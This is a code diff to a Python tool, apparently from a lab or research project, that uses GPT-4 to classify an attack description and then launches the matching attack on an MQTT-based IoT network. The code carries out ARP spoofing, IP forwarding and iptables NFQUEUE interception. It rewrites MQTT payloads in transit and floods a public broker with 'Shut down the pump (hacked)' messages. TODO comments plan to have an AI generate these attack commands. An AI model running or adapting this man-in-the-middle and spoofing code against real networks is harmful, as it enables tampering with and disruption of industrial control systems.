@@ -11,7 +11,6 @@ import subprocess
 import signal
 import time
 from netfilterqueue import NetfilterQueue
-#from langchain.chat_models import ChatOpenAI
 API_KEY = "Insert here"
 openai.api_key = API_KEY
 llm_model = "gpt-4"
@@ -23,7 +22,6 @@ sniffed_message = ""
 desired_payload = None
 stop_flag = False
 def lang_classification ():
-    #print(rec)
     llm_model = "gpt-4"
     {
     "attack_class_fdt": False,
@@ -31,18 +29,12 @@ def lang_classification ():
     "attack_class_phsh": False,
     }
 
-
-    #if(rec): 
-        #print ("Inline Classification: ", message)
-    
-    
-    #high_level_attack_description = """ message """
     high_level_attack_description = message
     
     attack_template = """\
     For the following text, extract the following information:
 
-    attack_class_fdt: Does the description suggest innacurate meter readings caused by potential manipulation? \
+    attack_class_fdt: Does the description suggest innacurate meter readings caused by potential data manipulation? Or does the description suggest input not performing intended actions but is still connected to the MQTT server? \
     Answer True if yes, False if not or unknown.
 
     attack_class_dos: Does the description indicate flooding or overloading of resources on the network ? \
@@ -62,7 +54,6 @@ def lang_classification ():
     
     
     prompt_template = ChatPromptTemplate.from_template(attack_template)
-    #print(prompt_template)
     messages = prompt_template.format_messages(text=high_level_attack_description)
     chat = ChatOpenAI(temperature=0.0, model=llm_model, openai_api_key= API_KEY)
     response = chat(messages)
@@ -110,7 +101,6 @@ def process_packet(packet):
         ip_dst = packet[IP].dst
         tcp_sport = packet[TCP].sport
         tcp_dport = packet[TCP].dport
-#        print("incomming ")
         # Check if this is MQTT traffic between the two VMs
         if (tcp_sport == 1883 or tcp_dport == 1883):
             # Attempt to parse MQTT payload
@@ -122,7 +112,10 @@ def process_packet(packet):
                 sniffed_topic = topic
         
                 
-
+'''
+execute_attack()- Method responsible for analyzing the json respone provided by chatGPT4 
+and determining which attack script to execute.
+'''
 def execute_attack(json_response):
     if (json_response["attack_class_dos"]):
         denial_of_service()
@@ -131,30 +124,51 @@ def execute_attack(json_response):
         fake_data_transfer_attack()
     elif (json_response["attack_class_phsh"]):
         print("Perform phishing attack")
+
+'''
+denial_of_service() - Method responsible for performing the denial of service attack.
+'''
 def denial_of_service():
     try:
         print("Performing Denial of Serivce Attack....")
+        #TODO: Have AI generate this command
         os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
         #Reroutes packets from the MQTT server through this computer.
+        #TODO: Have AI generate this command.
         nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1", ">", "garbage.txt"])
         while True:
+            #TODO: Have AI generate this command.
             os.system('mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "Shut down the pump (hacked)"')
             time.sleep(5)
+    #Kills the program when desired.
     except KeyboardInterrupt:
         print("Stopping DDOS process...")
         os.kill(nodeAttack.pid, signal.SIGTERM)
+
+'''
+mqtt_message_modifier() - Modifies the current payload of the MQTT message filled with garbage.
+TODO: Have AI construct a more meaningful message of equal length. For example, if we are manipulating meter
+readings, have it generate a random reasonable number of equal amount of digits. 
+IMPORTANT: They must be of equal length due to TCP protocol.
+'''
 def mqtt_message_modifier(payload):
     try:
         # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
         # and variable header starting with the topic length (2 bytes)
         topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
-        topic = payload[4:4+topic_len].decode()  # Extract topic
-        message = payload[4+topic_len:].decode()
-        new_message = "z" * len(message)
-        new_payload = payload[:4+topic_len] + new_message.encode()
+        topic = payload[4:4+topic_len].decode()  # Extracts topic
+        message = payload[4+topic_len:].decode() #Extracts message
+        new_message = "z" * len(message) #Modified message
+        new_payload = payload[:4+topic_len] + new_message.encode() #Reconstructs the payload
         return new_payload
     except Exception as e:
         return None
+
+'''
+intercept_modify_forward() - Takes intercepted packet and determines if its a MQTT packet.
+Then modifies the payload and send it.
+
+'''
 def intercept_modify_forward(pkt):
     global sniffed_topic, sniffed_message
     global targetIP, desired_payload
@@ -166,20 +180,24 @@ def intercept_modify_forward(pkt):
         tcp_dport = packet[TCP].dport 
         ack_num = packet[TCP].seq + len(packet[TCP].payload)
         seq_num = packet[TCP].seq
+
         # Check if this is MQTT traffic between the two VMs
         if (tcp_dport == 1883 and ip_src == targetIP):
             topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
             if topic and message:
+                #Constructs and assigns new payload.
                 new_payload = mqtt_message_modifier(bytes(packet[TCP].payload))
                 packet[Raw].load = new_payload
                 #Recalculates the checksum
                 del packet[IP].chksum
                 del packet[TCP].chksum
+                #print(packet[IP].len)
                 original_stdout = sys.stdout
                 sys.stdout = open(os.devnull, 'w')
+                #Reconstructs checksum values
                 packet.show2()
                 pkt.set_payload(bytes(packet))
-                packet = IP(pkt.get_payload())
+                #Sends packet
                 pkt.accept()
                 sys.stdout = original_stdout
                 
@@ -189,7 +207,7 @@ def intercept_modify_forward(pkt):
             pkt.accept()
     else:
         pkt.accept()
-
+'''
 def generate_fake_payload(packet):
     global sniffed_topic, sniffed_message
     global targetIP, desired_payload
@@ -210,22 +228,22 @@ def publish_fake_message():
     global stop_flag
     while not stop_flag:
         new_message = 'z' * len(sniffed_message)
-        new_message = "Shut down the pumps you"
         os.system(f'mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "{new_message}"')
         time.sleep(2)
+'''
+'''
+fake_data_transfer_attack() - Performs fake data transfer
+'''
 def fake_data_transfer_attack():
     global targetIP, client, desired_payload, stop_flag
-    #PERFORM PACKET SNIFFING:
-    #start_time = time.time()
+    #Performs packet sniffing to discover topic and message:
+    #TODO allow for multiple topics to be found. Then have AI determine which topic would be appropriate for attacking.
     print("Performing Fake Data Transfer...")
     print("Sniffing Packets...")
     sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 5)
     print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
     
     try:
-        #Generate Fake MQTT Message:
-        #Enables nfqueue
-        
         """
         while desired_payload is None:
             '''
@@ -244,15 +262,19 @@ def fake_data_transfer_attack():
         stop_flag = True
         """
         #Enables ip forwarding (hence passing on the packets we get)
+        #TODO: Have AI generate this command
         os.system("sudo sysctl -w net.ipv4.ip_forward=1")
         #Reroutes the packets from the gateway router through this computer.
+        #TODO: Have AI generate this command. But you must have this program run in parrallel.
         routerAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.1", targetIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         time.sleep(3)
         #Reroutes packets from the MQTT server through this computer.
+        #TODO: Have AI generate this command. But you must have this program run in parrallel.
         nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, "192.168.1.1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         time.sleep(3)
-        #Enables nfqueue
-        os.system("sudo iptables -A FORWARD -s 192.168.1.17 -j NFQUEUE --queue-num 1")
+        #Enables reroutes packets from 192.168.1.17 into a nfqueue object for filtering and potential data manipulation.
+        #TODO: Have AI generate this command.
+        os.system("sudo iptables -A FORWARD -s 192.168.1.17 -j NFQUEUE --queue-num 1") #IPTABLES COMMAND
         nfqueue = NetfilterQueue()
         nfqueue.bind(1, intercept_modify_forward)
         nfqueue.run()
@@ -265,6 +287,7 @@ def fake_data_transfer_attack():
         print("Stopping sniffing")
         os.kill(nodeAttack.pid, signal.SIGTERM)
         os.kill(routerAttack.pid, signal.SIGTERM)
+        #TODO: AI needs to generate a command that deletes whatever is generated on line 277 (or where is says IPTABLES COMMAND)
         os.system("sudo iptables -D FORWARD -s 192.168.1.17 -j NFQUEUE --queue-num 1")
         # Clean up when the user interrupts the script
         nfqueue.unbind()
@@ -288,7 +311,6 @@ def fake_data_transfer_attack():
         os.kill(nodeAttack.pid, signal.SIGTERM)
         os.kill(routerAttack.pid, signal.SIGTERM)
     """
-    #TODO: Use identified topic to stop message from going through and send fake message.
 
 client = mqtt.Client()
 
@@ -301,6 +323,7 @@ client.subscribe("attackMessage")
 
 client.loop_start()
 
+#TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).
 
 try:
     while True: 
